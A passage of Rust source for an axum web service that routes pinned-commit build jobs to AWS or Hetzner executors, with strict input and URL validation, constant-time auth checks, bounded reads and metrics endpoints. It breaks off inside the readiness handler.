use std::{
    collections::{BTreeMap, BTreeSet},
    env, fs,
    net::IpAddr,
    path::{Path, PathBuf},
    sync::{
        atomic::{AtomicU64, Ordering},
        Arc,
    },
    time::Duration,
};

use axum::{
    extract::{Path as AxumPath, State},
    http::{HeaderMap, StatusCode},
    response::{IntoResponse, Response},
    routing::{get, post},
    Json, Router,
};
use reqwest::Url;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use subtle::ConstantTimeEq;
use tokio::sync::{Mutex, Notify, RwLock};
use tracing::warn;

pub const SERVICE_NAME: &str = "gha-executor-router-rs";
const DEFAULT_MAX_EXECUTORS: usize = 2;
const HARD_MAX_EXECUTORS: usize = 4;
const DEFAULT_MAX_ROUTES: usize = 4096;
const HARD_MAX_ROUTES: usize = 65_536;
const DEFAULT_MAX_RESPONSE_BYTES: usize = 64 * 1024;
const HARD_MAX_RESPONSE_BYTES: usize = 1024 * 1024;
const MAX_SECRET_BYTES: u64 = 8192;
const MAX_REQUEST_ID_BYTES: usize = 256;
const MAX_PROFILE_BYTES: usize = 128;

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Provider {
    Aws,
    Hetzner,
}

impl Provider {
    fn as_str(self) -> &'static str {
        match self {
            Self::Aws => "aws",
            Self::Hetzner => "hetzner",
        }
    }
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct ExecutorSpec {
    pub id: String,
    pub provider: Provider,
    #[serde(default = "default_enabled")]
    pub enabled: bool,
    #[serde(default)]
    pub base_url: Option<String>,
    #[serde(default)]
    pub auth_secret_file: Option<PathBuf>,
}

fn default_enabled() -> bool {
    true
}
#[derive(Clone, Debug)]
struct Executor {
    id: String,
    provider: Provider,
    base_url: String,
    auth_secret_file: PathBuf,
    auth_secret: Option<String>,
}

#[derive(Clone, Debug)]
pub struct Config {
    pub host: String,
    pub port: u16,
    pub execution_enabled: bool,
    pub max_routes: usize,
    pub max_response_bytes: usize,
    pub request_timeout: Duration,
    inbound_auth_secret_file: Option<PathBuf>,
    inbound_auth_secret: Option<String>,
    executors: Vec<Executor>,
}

impl Config {
    pub fn from_env() -> Result<Self, String> {
        let execution_enabled = env_bool("GHA_EXECUTOR_ROUTER_EXECUTION_ENABLED", false)?;
        let max_executors = env_usize("GHA_EXECUTOR_ROUTER_MAX_EXECUTORS", DEFAULT_MAX_EXECUTORS)?;
        if max_executors == 0 || max_executors > HARD_MAX_EXECUTORS {
            return Err(format!(
                "GHA_EXECUTOR_ROUTER_MAX_EXECUTORS must be between 1 and {HARD_MAX_EXECUTORS}"
            ));
        }
        let specs = env::var("GHA_EXECUTOR_ROUTER_EXECUTORS_JSON")
            .ok()
            .filter(|value| !value.trim().is_empty())
            .map(|value| {
                serde_json::from_str::<Vec<ExecutorSpec>>(&value).map_err(|error| {
                    format!("GHA_EXECUTOR_ROUTER_EXECUTORS_JSON is invalid: {error}")
                })
            })
            .transpose()?
            .unwrap_or_default();
        let executors = build_executors(specs, max_executors, execution_enabled)?;

        let inbound_auth_secret_file = env::var("GHA_EXECUTOR_ROUTER_AUTH_SECRET_FILE")
            .ok()
            .map(|value| PathBuf::from(value.trim()))
            .filter(|path| !path.as_os_str().is_empty());
        if let Some(path) = inbound_auth_secret_file.as_deref() {
            require_absolute_secret_path(path, "GHA_EXECUTOR_ROUTER_AUTH_SECRET_FILE")?;
        }
        let inbound_auth_secret = if execution_enabled {
            inbound_auth_secret_file
                .as_deref()
                .map(|path| read_secret_file(path, "router operator auth"))
                .transpose()?
        } else {
            None
        };

        let max_routes = env_usize("GHA_EXECUTOR_ROUTER_MAX_ROUTES", DEFAULT_MAX_ROUTES)?;
        if max_routes == 0 || max_routes > HARD_MAX_ROUTES {
            return Err(format!(
                "GHA_EXECUTOR_ROUTER_MAX_ROUTES must be between 1 and {HARD_MAX_ROUTES}"
            ));
        }
        let max_response_bytes = env_usize(
            "GHA_EXECUTOR_ROUTER_MAX_RESPONSE_BYTES",
            DEFAULT_MAX_RESPONSE_BYTES,
        )?;
        if max_response_bytes == 0 || max_response_bytes > HARD_MAX_RESPONSE_BYTES {
            return Err(format!(
                "GHA_EXECUTOR_ROUTER_MAX_RESPONSE_BYTES must be between 1 and {HARD_MAX_RESPONSE_BYTES}"
            ));
        }
        let request_timeout_seconds = env_u64("GHA_EXECUTOR_ROUTER_REQUEST_TIMEOUT_SECONDS", 60)?;
        if !(1..=300).contains(&request_timeout_seconds) {
            return Err(
                "GHA_EXECUTOR_ROUTER_REQUEST_TIMEOUT_SECONDS must be between 1 and 300".to_string(),
            );
        }

        let config = Self {
            host: env::var("HOST").unwrap_or_else(|_| "0.0.0.0".to_string()),
            port: env_u16("PORT", 8126)?,
            execution_enabled,
            max_routes,
            max_response_bytes,
            request_timeout: Duration::from_secs(request_timeout_seconds),
            inbound_auth_secret_file,
            inbound_auth_secret,
            executors,
        };
        config.validate()?;
        Ok(config)
    }

    fn validate(&self) -> Result<(), String> {
        if self.execution_enabled {
            if self.inbound_auth_secret.is_none() {
                return Err("execution requires GHA_EXECUTOR_ROUTER_AUTH_SECRET_FILE".to_string());
            }
            if self.executors.is_empty() {
                return Err("execution requires at least one complete executor".to_string());
            }
            if self
                .executors
                .iter()
                .any(|executor| executor.auth_secret.is_none())
            {
                return Err("execution requires every executor auth secret".to_string());
            }
        }
        validate_executor_set(&self.executors)
    }

    fn ready(&self) -> bool {
        !self.execution_enabled
            || (self.inbound_auth_secret.is_some()
                && !self.executors.is_empty()
                && self
                    .executors
                    .iter()
                    .all(|executor| executor.auth_secret.is_some()))
    }
}

fn build_executors(
    specs: Vec<ExecutorSpec>,
    max_executors: usize,
    execution_enabled: bool,
) -> Result<Vec<Executor>, String> {
    if specs.len() > max_executors {
        return Err(format!(
            "configured {} executor identities, above the bounded maximum {max_executors}",
            specs.len()
        ));
    }

    let mut ids = BTreeSet::new();
    let mut providers = BTreeSet::new();
    let mut executors = Vec::with_capacity(specs.len());
    for spec in specs {
        require_executor_id(&spec.id)?;
        if !ids.insert(spec.id.clone()) {
            return Err(format!("duplicate executor id {:?}", spec.id));
        }
        if !providers.insert(spec.provider.as_str()) {
            return Err(format!(
                "duplicate provider {:?}; configure at most one identity per provider",
                spec.provider.as_str()
            ));
        }

        if !spec.enabled {
            if spec.base_url.is_some() || spec.auth_secret_file.is_some() {
                return Err(format!(
                    "disabled executor {} must omit baseUrl and authSecretFile",
                    spec.id
                ));
            }
            continue;
        }

        let base_url = spec
            .base_url
            .ok_or_else(|| format!("enabled executor {} requires baseUrl", spec.id))?;
        let auth_secret_file = spec
            .auth_secret_file
            .ok_or_else(|| format!("enabled executor {} requires authSecretFile", spec.id))?;
        let base_url = validate_base_url(&base_url)?;
        require_absolute_secret_path(&auth_secret_file, "executor authSecretFile")?;
        let auth_secret = if execution_enabled {
            Some(read_secret_file(
                &auth_secret_file,
                &format!("{} executor auth", spec.id),
            )?)
        } else {
            None
        };
        executors.push(Executor {
            id: spec.id,
            provider: spec.provider,
            base_url,
            auth_secret_file,
            auth_secret,
        });
    }
    validate_executor_set(&executors)?;
    Ok(executors)
}
fn validate_executor_set(executors: &[Executor]) -> Result<(), String> {
    let mut ids = BTreeSet::new();
    let mut providers = BTreeSet::new();
    let mut urls = BTreeSet::new();
    let mut secret_files = BTreeSet::new();
    for executor in executors {
        if !ids.insert(executor.id.clone()) {
            return Err(format!("duplicate executor id {:?}", executor.id));
        }
        if !providers.insert(executor.provider.as_str()) {
            return Err(format!(
                "duplicate provider {:?}; configure at most one endpoint per provider",
                executor.provider.as_str()
            ));
        }
        if !urls.insert(executor.base_url.clone()) {
            return Err("executor base URLs must be unique".to_string());
        }
        if !secret_files.insert(executor.auth_secret_file.clone()) {
            return Err("executor auth secret files must be unique".to_string());
        }
    }
    Ok(())
}

fn validate_base_url(raw: &str) -> Result<String, String> {
    let raw = raw.trim();
    let url = Url::parse(raw).map_err(|error| format!("invalid executor base URL: {error}"))?;
    if !url.username().is_empty() || url.password().is_some() {
        return Err("executor base URL must not contain credentials".to_string());
    }
    if url.query().is_some() || url.fragment().is_some() {
        return Err("executor base URL must not contain a query or fragment".to_string());
    }
    if url.path() != "/" && !url.path().is_empty() {
        return Err("executor base URL must not contain a path".to_string());
    }
    if url.port() == Some(0) {
        return Err("executor base URL port must be nonzero".to_string());
    }
    let host = url
        .host_str()
        .ok_or_else(|| "executor base URL must contain a host".to_string())?;
    let loopback = host.eq_ignore_ascii_case("localhost")
        || host
            .parse::<IpAddr>()
            .is_ok_and(|address| address.is_loopback());
    let cluster_service = host.ends_with(".svc") || host.ends_with(".svc.cluster.local");
    match url.scheme() {
        "https" => {}
        "http" if loopback || cluster_service => {}
        "http" => {
            return Err(
                "plain HTTP is allowed only for loopback tests or Kubernetes service DNS"
                    .to_string(),
            )
        }
        _ => return Err("executor base URL must use HTTPS".to_string()),
    }
    Ok(raw.trim_end_matches('/').to_string())
}

fn require_absolute_secret_path(path: &Path, label: &str) -> Result<(), String> {
    if !path.is_absolute() {
        return Err(format!("{label} must be an absolute mounted file path"));
    }
    if path.components().any(|component| {
        matches!(
            component,
            std::path::Component::ParentDir | std::path::Component::CurDir
        )
    }) {
        return Err(format!("{label} must not contain traversal components"));
    }
    Ok(())
}

fn read_secret_file(path: &Path, label: &str) -> Result<String, String> {
    require_absolute_secret_path(path, label)?;
    let metadata = fs::symlink_metadata(path)
        .map_err(|error| format!("cannot inspect {label} file {}: {error}", path.display()))?;
    if metadata.file_type().is_symlink() || !metadata.is_file() {
        return Err(format!("{label} must be a regular non-symlink file"));
    }
    if metadata.len() == 0 || metadata.len() > MAX_SECRET_BYTES {
        return Err(format!(
            "{label} must contain between 1 and {MAX_SECRET_BYTES} bytes"
        ));
    }
    let secret = fs::read_to_string(path)
        .map_err(|error| format!("cannot read {label} file {}: {error}", path.display()))?;
    let secret = secret.trim().to_string();
    if secret.is_empty() {
        return Err(format!("{label} must not be empty"));
    }
    Ok(secret)
}

fn require_executor_id(value: &str) -> Result<(), String> {
    if value.is_empty()
        || value.len() > 32
        || value.starts_with('-')
        || value.ends_with('-')
        || !value
            .bytes()
            .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'-')
    {
        return Err(format!(
            "invalid executor id {value:?}; expected a lowercase slug"
        ));
    }
    Ok(())
}

#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct BuildRequest {
    pub schema_version: String,
    pub job_kind: String,
    pub repo_url: String,
    pub git_ref: String,
    pub profile: String,
    pub request_id: String,
}

impl BuildRequest {
    fn validate(&self) -> Result<(), RouterError> {
        if self.schema_version != "build-server.v1" {
            return Err(RouterError::unprocessable(
                "invalid_schema",
                "schemaVersion must be build-server.v1",
            ));
        }
        if self.job_kind != "run-profile" {
            return Err(RouterError::unprocessable(
                "unsupported_job_kind",
                "only the operator-reviewed run-profile job kind is routable",
            ));
        }
        if !safe_token(&self.profile, MAX_PROFILE_BYTES, b"-_.") {
            return Err(RouterError::unprocessable(
                "invalid_profile",
                "profile must be a bounded fixed-profile identifier",
            ));
        }
        if !safe_token(&self.request_id, MAX_REQUEST_ID_BYTES, b"-_.:") {
            return Err(RouterError::unprocessable(
                "invalid_request_id",
                "requestId must be a bounded deterministic identifier",
            ));
        }
        if self.git_ref.len() != 40
            || !self
                .git_ref
                .bytes()
                .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
        {
            return Err(RouterError::unprocessable(
                "mutable_revision",
                "gitRef must be a full lowercase commit SHA",
            ));
        }
        validate_github_repo_url(&self.repo_url)?;
        Ok(())
    }
}

fn validate_github_repo_url(raw: &str) -> Result<(), RouterError> {
    let url = Url::parse(raw).map_err(|_| {
        RouterError::unprocessable("invalid_repository", "repoUrl must be a valid HTTPS URL")
    })?;
    if url.scheme() != "https"
        || url.host_str() != Some("github.com")
        || !url.username().is_empty()
        || url.password().is_some()
        || url.query().is_some()
        || url.fragment().is_some()
    {
        return Err(RouterError::unprocessable(
            "invalid_repository",
            "repoUrl must be an uncredentialed https://github.com/<org>/<repo>.git URL",
        ));
    }
    let segments = url
        .path_segments()
        .map(|segments| {
            segments
                .filter(|segment| !segment.is_empty())
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    if segments.len() != 2
        || !segments[1].ends_with(".git")
        || !safe_repo_segment(segments[0])
        || !safe_repo_segment(segments[1].trim_end_matches(".git"))
    {
        return Err(RouterError::unprocessable(
            "invalid_repository",
            "repoUrl must identify exactly one GitHub org/repository",
        ));
    }
    Ok(())
}

fn safe_repo_segment(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 100
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || b"-_.".contains(&byte))
}

fn safe_token(value: &str, max: usize, punctuation: &[u8]) -> bool {
    !value.is_empty()
        && value.len() <= max
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || punctuation.contains(&byte))
}

#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BuildJob {
    pub id: String,
    pub status: String,
    #[serde(default, flatten)]
    pub fields: BTreeMap<String, Value>,
}

#[derive(Clone, Debug)]
struct Route {
    request_id: String,
    external_id: String,
    executor_id: String,
    provider: Provider,
    upstream_id: String,
    accepted: BuildJob,
    sequence: u64,
}

impl Route {
    fn public_job(&self, mut job: BuildJob) -> BuildJob {
        job.id = self.external_id.clone();
        job.fields.insert(
            "executorId".to_string(),
            Value::String(self.executor_id.clone()),
        );
        job.fields.insert(
            "provider".to_string(),
            Value::String(self.provider.as_str().to_string()),
        );
        job.fields.insert(
            "requestId".to_string(),
            Value::String(self.request_id.clone()),
        );
        job
    }
}

#[derive(Default)]
struct RouteMaps {
    by_request: BTreeMap<String, Route>,
    by_external: BTreeMap<String, Route>,
}

struct Inflight {
    result: Mutex<Option<Result<BuildJob, RouterError>>>,
    notify: Notify,
}

impl Inflight {
    fn new() -> Self {
        Self {
            result: Mutex::new(None),
            notify: Notify::new(),
        }
    }
}

#[derive(Default)]
struct Metrics {
    submissions: AtomicU64,
    accepted: AtomicU64,
    readiness_skips: AtomicU64,
    contract_rejections: AtomicU64,
    exhausted: AtomicU64,
    duplicate_hits: AtomicU64,
    polls: AtomicU64,
    poll_failures: AtomicU64,
}

#[derive(Clone)]
pub struct Engine {
    config: Arc<Config>,
    client: reqwest::Client,
    routes: Arc<RwLock<RouteMaps>>,
    inflight: Arc<Mutex<BTreeMap<String, Arc<Inflight>>>>,
    sequence: Arc<AtomicU64>,
    metrics: Arc<Metrics>,
}

impl Engine {
    pub fn new(config: Config) -> Result<Self, String> {
        config.validate()?;
        let client = reqwest::Client::builder()
            .connect_timeout(config.request_timeout)
            .timeout(config.request_timeout)
            .redirect(reqwest::redirect::Policy::none())
            .user_agent("gha-executor-router/0.1")
            .build()
            .map_err(|error| format!("failed to build HTTP client: {error}"))?;
        Ok(Self {
            config: Arc::new(config),
            client,
            routes: Arc::new(RwLock::new(RouteMaps::default())),
            inflight: Arc::new(Mutex::new(BTreeMap::new())),
            sequence: Arc::new(AtomicU64::new(1)),
            metrics: Arc::new(Metrics::default()),
        })
    }

    pub async fn submit(&self, request: BuildRequest) -> Result<BuildJob, RouterError> {
        request.validate()?;
        if !self.config.execution_enabled {
            return Err(RouterError::unavailable(
                "execution_disabled",
                "independent executor routing is disabled",
            ));
        }
        if !self.config.ready() {
            return Err(RouterError::unavailable(
                "router_not_ready",
                "executor routing is not ready",
            ));
        }
        self.metrics.submissions.fetch_add(1, Ordering::Relaxed);

        if let Some(route) = self
            .routes
            .read()
            .await
            .by_request
            .get(&request.request_id)
            .cloned()
        {
            self.metrics.duplicate_hits.fetch_add(1, Ordering::Relaxed);
            return Ok(route.public_job(route.accepted.clone()));
        }

        let (inflight, owner) = {
            let mut entries = self.inflight.lock().await;
            match entries.get(&request.request_id) {
                Some(existing) => (existing.clone(), false),
                None => {
                    let created = Arc::new(Inflight::new());
                    entries.insert(request.request_id.clone(), created.clone());
                    (created, true)
                }
            }
        };

        if !owner {
            self.metrics.duplicate_hits.fetch_add(1, Ordering::Relaxed);
            loop {
                let notified = inflight.notify.notified();
                if let Some(result) = inflight.result.lock().await.clone() {
                    return result;
                }
                notified.await;
            }
        }

        let result = self.submit_fresh(&request).await;
        let public_result = match result {
            Ok(route) => {
                let public = route.public_job(route.accepted.clone());
                self.insert_route(route).await;
                Ok(public)
            }
            Err(error) => Err(error),
        };
        *inflight.result.lock().await = Some(public_result.clone());
        self.inflight.lock().await.remove(&request.request_id);
        inflight.notify.notify_waiters();
        public_result
    }

    async fn select_ready_executor(&self) -> Result<Executor, RouterError> {
        for executor in &self.config.executors {
            let auth = executor.auth_secret.as_deref().ok_or_else(|| {
                RouterError::unavailable("executor_not_ready", "executor auth is unavailable")
            })?;
            let response = self
                .client
                .get(format!("{}/readyz", executor.base_url))
                .header("x-build-server-auth", auth)
                .send()
                .await;
            let response = match response {
                Ok(response) => response,
                Err(error) => {
                    self.metrics.readiness_skips.fetch_add(1, Ordering::Relaxed);
                    warn!(
                        executor_id = %executor.id,
                        provider = executor.provider.as_str(),
                        error = %error,
                        "executor readiness transport failed before any build submission"
                    );
                    continue;
                }
            };
            let status = response.status();
            if status != StatusCode::OK {
                self.metrics.readiness_skips.fetch_add(1, Ordering::Relaxed);
                warn!(
                    executor_id = %executor.id,
                    provider = executor.provider.as_str(),
                    %status,
                    "executor readiness was not OK before any build submission"
                );
                continue;
            }
            let body = match read_bounded(response, self.config.max_response_bytes).await {
                Ok(body) => body,
                Err(_) => {
                    self.metrics.readiness_skips.fetch_add(1, Ordering::Relaxed);
                    warn!(
                        executor_id = %executor.id,
                        provider = executor.provider.as_str(),
                        "executor readiness response was unreadable before any build submission"
                    );
                    continue;
                }
            };
            let ready = serde_json::from_slice::<Value>(&body)
                .ok()
                .and_then(|value| value.get("ok").and_then(Value::as_bool))
                .unwrap_or(false);
            if !ready {
                self.metrics.readiness_skips.fetch_add(1, Ordering::Relaxed);
                warn!(
                    executor_id = %executor.id,
                    provider = executor.provider.as_str(),
                    "executor readiness body did not assert ok=true"
                );
                continue;
            }
            return Ok(executor.clone());
        }

        self.metrics.exhausted.fetch_add(1, Ordering::Relaxed);
        Err(RouterError::unavailable(
            "executors_unavailable",
            "no executor reported ready before any build submission",
        ))
    }

    async fn submit_fresh(&self, request: &BuildRequest) -> Result<Route, RouterError> {
        let executor = self.select_ready_executor().await?;
        let auth = executor.auth_secret.as_deref().ok_or_else(|| {
            RouterError::unavailable("executor_not_ready", "executor auth is unavailable")
        })?;
        let response = self
        .client
        .post(format!("{}/builds", executor.base_url))
        .header("x-build-server-auth", auth)
        .json(request)
        .send()
        .await
        .map_err(|error| {
            warn!(
                executor_id = %executor.id,
                provider = executor.provider.as_str(),
                error = %error,
                "executor submission outcome is ambiguous after the POST attempt"
            );
            RouterError::bad_gateway(
                "submission_outcome_ambiguous",
                format!(
                    "submission to executor {} failed after the POST attempt; fallback was not attempted because work may already exist",
                    executor.id
                ),
            )
        })?;

        let status = response.status();
        if status != StatusCode::ACCEPTED {
            if status.is_client_error() && status != StatusCode::TOO_MANY_REQUESTS {
                self.metrics
                    .contract_rejections
                    .fetch_add(1, Ordering::Relaxed);
                return Err(RouterError::new(
                StatusCode::UNPROCESSABLE_ENTITY,
                "upstream_contract_rejected",
                format!(
                    "executor {} rejected the fixed-profile request with HTTP {status}; fallback was not attempted",
                    executor.id
                ),
            ));
            }
            return Err(RouterError::bad_gateway(
            "submission_outcome_ambiguous",
            format!(
                "executor {} returned HTTP {status} after the POST attempt; fallback was not attempted because work may already exist",
                executor.id
            ),
        ));
        }

        let body = read_bounded(response, self.config.max_response_bytes)
        .await
        .map_err(|_| {
            RouterError::bad_gateway(
                "accepted_response_invalid",
                format!(
                    "executor {} accepted the request but returned an unreadable response; fallback was not attempted",
                    executor.id
                ),
            )
        })?;
        let accepted: BuildJob = serde_json::from_slice(&body).map_err(|_| {
        RouterError::bad_gateway(
            "accepted_response_invalid",
            format!(
                "executor {} accepted the request but returned invalid job JSON; fallback was not attempted",
                executor.id
            ),
        )
    })?;
        if !safe_token(&accepted.id, 128, b"-_:") {
            return Err(RouterError::bad_gateway(
            "accepted_response_invalid",
            format!(
                "executor {} accepted the request but returned an invalid build id; fallback was not attempted",
                executor.id
            ),
        ));
        }
        if !matches!(
            accepted.status.as_str(),
            "queued" | "running" | "succeeded" | "failed"
        ) {
            return Err(RouterError::bad_gateway(
            "accepted_response_invalid",
            format!(
                "executor {} accepted the request but returned an unknown status; fallback was not attempted",
                executor.id
            ),
        ));
        }

        self.metrics.accepted.fetch_add(1, Ordering::Relaxed);
        let external_id = format!("{}~{}", executor.id, accepted.id);
        Ok(Route {
            request_id: request.request_id.clone(),
            external_id,
            executor_id: executor.id,
            provider: executor.provider,
            upstream_id: accepted.id.clone(),
            accepted,
            sequence: self.sequence.fetch_add(1, Ordering::Relaxed),
        })
    }
    async fn insert_route(&self, route: Route) {
        let mut routes = self.routes.write().await;
        while routes.by_request.len() >= self.config.max_routes {
            let Some(oldest) = routes
                .by_request
                .values()
                .min_by_key(|entry| entry.sequence)
                .cloned()
            else {
                break;
            };
            routes.by_request.remove(&oldest.request_id);
            routes.by_external.remove(&oldest.external_id);
        }
        routes
            .by_external
            .insert(route.external_id.clone(), route.clone());
        routes.by_request.insert(route.request_id.clone(), route);
    }

    pub async fn poll(&self, external_id: &str) -> Result<BuildJob, RouterError> {
        if !safe_token(external_id, 256, b"-_:~") {
            return Err(RouterError::not_found(
                "route_not_found",
                "build route not found",
            ));
        }
        let route = self
            .routes
            .read()
            .await
            .by_external
            .get(external_id)
            .cloned()
            .ok_or_else(|| RouterError::not_found("route_not_found", "build route not found"))?;
        let executor = self
            .config
            .executors
            .iter()
            .find(|executor| executor.id == route.executor_id)
            .ok_or_else(|| {
                RouterError::bad_gateway(
                    "pinned_executor_missing",
                    "the accepted build's pinned executor is no longer configured",
                )
            })?;
        let auth = executor.auth_secret.as_deref().ok_or_else(|| {
            RouterError::bad_gateway(
                "pinned_executor_unavailable",
                "the accepted build's pinned executor auth is unavailable",
            )
        })?;
        self.metrics.polls.fetch_add(1, Ordering::Relaxed);
        let response = self
            .client
            .get(format!(
                "{}/builds/{}",
                executor.base_url, route.upstream_id
            ))
            .header("x-build-server-auth", auth)
            .send()
            .await
            .map_err(|error| {
                self.metrics.poll_failures.fetch_add(1, Ordering::Relaxed);
                warn!(
                    executor_id = %executor.id,
                    provider = executor.provider.as_str(),
                    error = %error,
                    "pinned executor status transport failed"
                );
                RouterError::bad_gateway(
                    "pinned_executor_poll_failed",
                    format!(
                        "status polling failed for the build pinned to executor {}; the job was not resubmitted",
                        executor.id
                    ),
                )
            })?;
        let status = response.status();
        if status != StatusCode::OK {
            self.metrics.poll_failures.fetch_add(1, Ordering::Relaxed);
            return Err(RouterError::bad_gateway(
                "pinned_executor_poll_failed",
                format!(
                    "executor {} returned HTTP {status} while polling its accepted build; the job was not resubmitted",
                    executor.id
                ),
            ));
        }
        let body = read_bounded(response, self.config.max_response_bytes)
            .await
            .map_err(|_| {
                self.metrics.poll_failures.fetch_add(1, Ordering::Relaxed);
                RouterError::bad_gateway(
                    "pinned_executor_poll_failed",
                    format!(
                        "executor {} returned an unreadable status response; the job was not resubmitted",
                        executor.id
                    ),
                )
            })?;
        let job: BuildJob = serde_json::from_slice(&body).map_err(|_| {
            self.metrics.poll_failures.fetch_add(1, Ordering::Relaxed);
            RouterError::bad_gateway(
                "pinned_executor_poll_failed",
                format!(
                    "executor {} returned invalid status JSON; the job was not resubmitted",
                    executor.id
                ),
            )
        })?;
        if job.id != route.upstream_id {
            self.metrics.poll_failures.fetch_add(1, Ordering::Relaxed);
            return Err(RouterError::bad_gateway(
                "pinned_executor_identity_mismatch",
                format!(
                    "executor {} returned a different build identity; the job was not resubmitted",
                    executor.id
                ),
            ));
        }
        Ok(route.public_job(job))
    }

    async fn metrics_body(&self) -> String {
        let routes = self.routes.read().await.by_request.len();
        let mut body = format!(
            "# HELP gha_executor_router_submissions_total Valid fixed-profile submissions received.\n\
             # TYPE gha_executor_router_submissions_total counter\n\
             gha_executor_router_submissions_total {}\n\
             # HELP gha_executor_router_accepted_total Requests accepted and pinned to one executor.\n\
             # TYPE gha_executor_router_accepted_total counter\n\
             gha_executor_router_accepted_total {}\n\
             # HELP gha_executor_router_readiness_skips_total Readiness probes that skipped an executor before any build submission.\n\
             # TYPE gha_executor_router_readiness_skips_total counter\n\
             gha_executor_router_readiness_skips_total {}\n\
             # HELP gha_executor_router_contract_rejections_total Fail-closed upstream contract rejections.\n\
             # TYPE gha_executor_router_contract_rejections_total counter\n\
             gha_executor_router_contract_rejections_total {}\n\
             # HELP gha_executor_router_exhausted_total Submissions for which no executor accepted.\n\
             # TYPE gha_executor_router_exhausted_total counter\n\
             gha_executor_router_exhausted_total {}\n\
             # HELP gha_executor_router_duplicate_hits_total Duplicate deterministic request ids served without resubmission.\n\
             # TYPE gha_executor_router_duplicate_hits_total counter\n\
             gha_executor_router_duplicate_hits_total {}\n\
             # HELP gha_executor_router_routes Current accepted request-to-executor route mappings.\n\
             # TYPE gha_executor_router_routes gauge\n\
             gha_executor_router_routes {}\n\
             # HELP gha_executor_router_polls_total Status polls sent only to the accepted executor.\n\
             # TYPE gha_executor_router_polls_total counter\n\
             gha_executor_router_polls_total {}\n\
             # HELP gha_executor_router_poll_failures_total Pinned-executor poll failures that did not trigger resubmission.\n\
             # TYPE gha_executor_router_poll_failures_total counter\n\
             gha_executor_router_poll_failures_total {}\n",
            self.metrics.submissions.load(Ordering::Relaxed),
            self.metrics.accepted.load(Ordering::Relaxed),
            self.metrics.readiness_skips.load(Ordering::Relaxed),
            self.metrics.contract_rejections.load(Ordering::Relaxed),
            self.metrics.exhausted.load(Ordering::Relaxed),
            self.metrics.duplicate_hits.load(Ordering::Relaxed),
            routes,
            self.metrics.polls.load(Ordering::Relaxed),
            self.metrics.poll_failures.load(Ordering::Relaxed),
        );
        for executor in &self.config.executors {
            body.push_str(&format!(
                "gha_executor_router_executor_configured{{executor=\"{}\",provider=\"{}\"}} 1\n",
                executor.id,
                executor.provider.as_str()
            ));
        }
        body
    }
}

async fn read_bounded(mut response: reqwest::Response, limit: usize) -> Result<Vec<u8>, String> {
    let mut body = Vec::new();
    while let Some(chunk) = response
        .chunk()
        .await
        .map_err(|error| format!("response read failed: {error}"))?
    {
        if body.len().saturating_add(chunk.len()) > limit {
            return Err("response exceeded configured byte limit".to_string());
        }
        body.extend_from_slice(&chunk);
    }
    Ok(body)
}

#[derive(Clone, Debug)]
pub struct RouterError {
    pub status: StatusCode,
    pub code: &'static str,
    pub message: String,
}

impl RouterError {
    fn new(status: StatusCode, code: &'static str, message: impl Into<String>) -> Self {
        Self {
            status,
            code,
            message: message.into(),
        }
    }

    fn unprocessable(code: &'static str, message: impl Into<String>) -> Self {
        Self::new(StatusCode::UNPROCESSABLE_ENTITY, code, message)
    }

    fn unavailable(code: &'static str, message: impl Into<String>) -> Self {
        Self::new(StatusCode::SERVICE_UNAVAILABLE, code, message)
    }

    fn bad_gateway(code: &'static str, message: impl Into<String>) -> Self {
        Self::new(StatusCode::BAD_GATEWAY, code, message)
    }

    fn not_found(code: &'static str, message: impl Into<String>) -> Self {
        Self::new(StatusCode::NOT_FOUND, code, message)
    }

    fn into_response(self) -> Response {
        (
            self.status,
            Json(json!({
                "error": self.code,
                "message": self.message,
            })),
        )
            .into_response()
    }
}

fn request_is_authorized(headers: &HeaderMap, expected: Option<&str>) -> Result<(), RouterError> {
    let expected = expected.ok_or_else(|| {
        RouterError::unavailable(
            "auth_not_configured",
            "router operator auth is not configured",
        )
    })?;
    let presented = headers
        .get("x-server-auth")
        .or_else(|| headers.get("x-build-server-auth"))
        .or_else(|| headers.get("x-agent-auth"))
        .and_then(|value| value.to_str().ok())
        .unwrap_or("");
    let expected_digest = Sha256::digest(expected.as_bytes());
    let presented_digest = Sha256::digest(presented.as_bytes());
    if bool::from(
        expected_digest
            .as_slice()
            .ct_eq(presented_digest.as_slice()),
    ) {
        Ok(())
    } else {
        Err(RouterError::new(
            StatusCode::UNAUTHORIZED,
            "unauthorized",
            "missing or invalid router auth header",
        ))
    }
}

pub fn app(engine: Engine) -> Router {
    Router::new()
        .route("/", get(descriptor))
        .route("/healthz", get(healthz))
        .route("/readyz", get(readyz))
        .route("/capabilities", get(capabilities))
        .route("/metrics", get(metrics))
        .route("/builds", post(submit_build))
        .route("/builds/:id", get(get_build))
        .with_state(engine)
}

async fn descriptor() -> Json<Value> {
    Json(json!({
        "service": SERVICE_NAME,
        "purpose": "Fail-closed pre-acceptance AWS/Hetzner routing for fixed dd-build-server profiles",
        "endpoints": {
            "submit": "POST /builds",
            "status": "GET /builds/<namespacedId>",
            "capabilities": "GET /capabilities",
            "health": "GET /healthz",
            "ready": "GET /readyz",
            "metrics": "GET /metrics"
        }
    }))
}

async fn healthz(State(engine): State<Engine>) -> Json<Value> {
    let executors = engine
        .config
        .executors
        .iter()
        .map(|executor| {
            json!({
                "id": executor.id,
                "provider": executor.provider,
                "authConfigured": executor.auth_secret.is_some(),
            })
        })
        .collect::<Vec<_>>();
    Json(json!({
        "ok": true,
        "service": SERVICE_NAME,
        "executionEnabled": engine.config.execution_enabled,
        "authConfigured": engine.config.inbound_auth_secret.is_some(),
        "authSecretFileConfigured": engine.config.inbound_auth_secret_file.is_some(),
        "executors": executors,
        "routesRetained": engine.routes.read().await.by_request.len(),
    }))
}

async fn readyz(State(engine): State<Engine>) -> Response {
